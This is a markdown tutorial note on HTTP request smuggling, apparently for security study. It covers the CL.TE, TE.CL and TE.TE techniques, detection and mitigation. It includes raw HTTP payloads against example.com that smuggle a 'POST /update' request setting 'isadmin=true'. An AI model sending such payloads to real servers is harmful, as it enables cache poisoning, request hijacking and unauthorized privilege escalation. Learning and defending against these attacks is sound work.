
# ğŸŒ HTTP Request Smuggling

## ğŸ“Œ What Is It?

**HTTP Request Smuggling (HRS)** is a vulnerability that arises when different components in a web infrastructure (load balancers, proxies, front-end servers, back-end servers) **interpret HTTP request boundaries inconsistently**.

- It typically involves the **Content-Length (CL)** and **Transfer-Encoding (TE)** headers.
    
- By exploiting these mismatches, attackers can **smuggle hidden requests**, manipulate back-end behavior, and poison caches.

---

## âš™ï¸ How It Works

- Relies on **HTTP keep-alive** and **pipelining** (multiple requests over the same TCP connection).
    
- Ambiguities arise when:
    
    - Both `Content-Length` and `Transfer-Encoding` headers are present.
        
    - Servers disagree on which one takes precedence.
        
- This desync allows a **smuggled request** to ride inside another.

![](../../Attachments/smuggling-http-request-to-back-end-server.svg)

---

## ğŸ§¨ Attack Process

1. Craft an ambiguous request containing **CL** and/or **TE** headers.
    
2. Front-end server interprets it differently from the back-end server.
    
3. The **back-end executes unintended smuggled request**.
    

ğŸ’¡ **Impact**:

- Cache poisoning (deliver malicious content to users).
    
- Hijacking other usersâ€™ requests/responses.
    
- Unauthorized access (e.g., bypassing auth with hidden requests).
    
- Denial of Service (back-end desync).
    

---

## ğŸ”¬ Key Headers

### ğŸ“ Content-Length

Specifies body size in bytes.

```http
POST /submit HTTP/1.1
Host: good.com
Content-Type: application/x-www-form-urlencoded
Content-Length: 14

q=smuggledData
```

### ğŸ“¦ Transfer-Encoding

Defines how body is encoded (often `chunked`).

```http
POST /submit HTTP/1.1
Host: good.com
Transfer-Encoding: chunked

b
q=smuggledData
0
```

---

## ğŸ§ª Core Techniques

### 1ï¸âƒ£ CL.TE (Content-Length â†’ Transfer-Encoding)

- **Front-end uses Content-Length**
    
- **Back-end uses Transfer-Encoding**
    

ğŸ“Œ **Payload**

```http
POST /search HTTP/1.1
Host: example.com
Content-Length: 130
Transfer-Encoding: chunked

0

POST /update HTTP/1.1
Host: example.com
Content-Length: 13
Content-Type: application/x-www-form-urlencoded

isadmin=true
```

ğŸ’¥ Result:

- Front-end sees request ending at CL (130 bytes).
    
- Back-end treats `0` as end of chunk â†’ interprets `POST /update` as a **new request**.
    

---

### 2ï¸âƒ£ TE.CL (Transfer-Encoding â†’ Content-Length)

- **Front-end uses Transfer-Encoding**
    
- **Back-end uses Content-Length**
    

ğŸ“Œ **Payload**

```http
POST / HTTP/1.1
Host: example.com
Content-Length: 4
Transfer-Encoding: chunked

78
POST /update HTTP/1.1
Host: example.com
Content-Type: application/x-www-form-urlencoded
Content-Length: 15

isadmin=true
0
```

ğŸ’¥ Result:

- Front-end consumes entire body as chunked until `0`.
    
- Back-end only reads 4 bytes (CL=4).
    
- Remainder (`POST /update`) treated as **smuggled request**.
    

---

### 3ï¸âƒ£ TE.TE (Transfer-Encoding Obfuscation)

- **Both front-end & back-end use TE**.
    
- Exploits **malformed or duplicate TE headers**.
    

ğŸ“Œ **Payload**

```http
POST / HTTP/1.1
Host: example.com
Content-length: 4
Transfer-Encoding: chunked
Transfer-Encoding: chunked1

4e
POST /update HTTP/1.1
Host: example.com
Content-length: 15

isadmin=true
0
```

ğŸ’¥ Result:

- Front-end ignores malformed TE (`chunked1`) and uses chunked normally.
    
- Back-end interprets differently (or falls back to CL).
    
- Smuggled request (`POST /update`) is executed.
    

---

## ğŸ§  Why It Works

- **Spec Ambiguity:** HTTP/1.1 allows both `Content-Length` and `Transfer-Encoding`, but behavior isnâ€™t consistent across implementations.
    
- **Proxy/Server Mismatch:** Different components prioritize headers differently.
    
- **Parsing errors:** Malformed headers can trigger unexpected fallback behaviors.
    

---

## ğŸ•µï¸ Detection & Testing

- Look for parameters that allow injecting custom headers.
    
- Send requests with **CL & TE** both present.
    
- Observe:
    
    - Desync between front-end and back-end responses.
        
    - Cache anomalies (unexpected content served).
        
    - Unexplained errors or broken requests.
        

âš ï¸ _Warning:_ Testing can break sites (cache poisoning, failed requests, DoS). Always test in controlled environments.

---

## ğŸ›¡ï¸ Mitigation

- Follow **RFC 7230** strictly:
    
    - If both CL & TE are present â†’ reject request.
        
- Normalize header parsing across all components.
    
- Update and patch load balancers, proxies, and web servers.
    
- Use **WAFs** with smuggling protections.
    
- Disable or carefully handle `Transfer-Encoding: chunked` where not required.
    
- Log anomalies (mismatched request boundaries).
    

---

## ğŸ” Key Takeaways

- HRS = exploiting **inconsistent parsing** between servers.
    
- Three core techniques: **CL.TE, TE.CL, TE.TE**.
    
- Impacts: **cache poisoning, desync attacks, privilege escalation, DoS**.
    
- Requires **careful testing** â†’ high risk of collateral impact.
    
- Mitigation: **consistent parsing, rejecting ambiguous headers, patching infrastructure**.
    

---
